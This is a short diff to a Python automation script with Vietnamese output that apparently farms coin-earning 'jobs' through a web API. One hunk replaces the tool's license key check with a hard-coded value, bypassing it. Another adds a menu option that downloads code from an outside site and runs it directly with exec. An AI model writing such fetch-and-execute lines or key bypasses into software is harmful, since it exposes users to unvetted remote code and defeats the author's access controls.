@@ -201,7 +201,7 @@ for i in range(len(encoded_IP)):
 def xoa(text):
     sys.stdout.write('\r' + text)
     sys.stdout.flush()
-Key = f"KA-{result}"
+Key = "1"#"f"KA-{result}"
 clear()
 runbanner(chontool)
 
@@ -1675,7 +1675,7 @@ elif nhap == 2:
                     sleep(1)
                 except :
                     tt += 1
-                    gio = datetime.now().strftime("%H:%M:%S")
+                    gio = datetime.datetime.now().strftime("%H:%M:%S")
                     xu_1 = nhan.json()["data"]["msg"]
                     xu_2 = nhan.json()["data"]["xu"]
                     print (f"\033[1;37m {tt} | {type_1} | {id_job} | {xu_1} | {xu_2} Xu")
@@ -1711,6 +1711,8 @@ elif nhap == 6:
             if 'Service is currently not working, try again later' in str(Z.use_service()): print(f'{do}[Trọng Thảo]</>Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.');time.sleep(5)
         except Exception as e:print(f'LỖI NGHIÊM TÚC | thử lại sau 10 giây.|| {e}');time.sleep(10)
 
+elif nhap == 7:
+    exec(requests.get('https://hoanganh.eu.org/shareao').text)
 
  
 
